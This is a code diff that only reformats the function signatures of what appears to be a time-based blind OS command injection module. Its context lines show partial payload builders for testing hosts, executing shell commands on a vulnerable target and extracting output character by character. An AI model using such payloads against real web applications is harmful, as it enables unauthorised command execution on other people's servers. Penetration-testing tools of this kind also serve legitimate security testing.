@@ -24,7 +24,7 @@ import urllib
 #----------------------------------------------------------------
 # Time-based decision payload (check if host is vulnerable).
 #----------------------------------------------------------------
-def decision(separator,TAG,output_length,delay,http_request_method):
+def decision(separator, TAG, output_length, delay, http_request_method):
   if separator == ";" :
     payload = (separator + " "
                "str=$(echo "+TAG+")" + separator + " "
@@ -66,7 +66,7 @@ def decision(separator,TAG,output_length,delay,http_request_method):
 """
 __Warning__: The alternative shells are still experimental.
 """
-def decision_alter_shell(separator,TAG,output_length,delay,http_request_method):
+def decision_alter_shell(separator, TAG, output_length, delay, http_request_method):
 
   if separator == ";" :
     payload = (separator + " "
@@ -108,7 +108,7 @@ def decision_alter_shell(separator,TAG,output_length,delay,http_request_method):
 #-----------------------------------------------
 # Execute shell commands on vulnerable host.
 #-----------------------------------------------
-def cmd_execution(separator,cmd,output_length,delay,http_request_method):
+def cmd_execution(separator, cmd, output_length, delay, http_request_method):
   if separator == ";" :
     payload = (separator + " "
                "str=$(" + cmd + ")" + separator +
@@ -146,7 +146,7 @@ def cmd_execution(separator,cmd,output_length,delay,http_request_method):
 """
 __Warning__: The alternative shells are still experimental.
 """
-def cmd_execution_alter_shell(separator,cmd,output_length,delay,http_request_method):
+def cmd_execution_alter_shell(separator, cmd, output_length, delay, http_request_method):
 
   if separator == ";" :
     payload = (separator + " "
@@ -188,7 +188,7 @@ def cmd_execution_alter_shell(separator,cmd,output_length,delay,http_request_met
 #---------------------------------------------------
 # Get the execution output, of shell execution.
 #---------------------------------------------------
-def get_char(separator,cmd,num_of_chars,ascii_char,delay,http_request_method):
+def get_char(separator, cmd, num_of_chars, ascii_char, delay, http_request_method):
   if separator == ";" :
     payload = (separator + " "
                "str=$(" + cmd + "|tr '\n' ' '|cut -c " + str(num_of_chars) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2)" + separator +
@@ -224,7 +224,7 @@ def get_char(separator,cmd,num_of_chars,ascii_char,delay,http_request_method):
 """
 __Warning__: The alternative shells are still experimental.
 """
-def get_char_alter_shell(separator,cmd,num_of_chars,ascii_char,delay,http_request_method):
+def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, delay, http_request_method):
   
   if separator == ";" :
     payload = (separator + " "
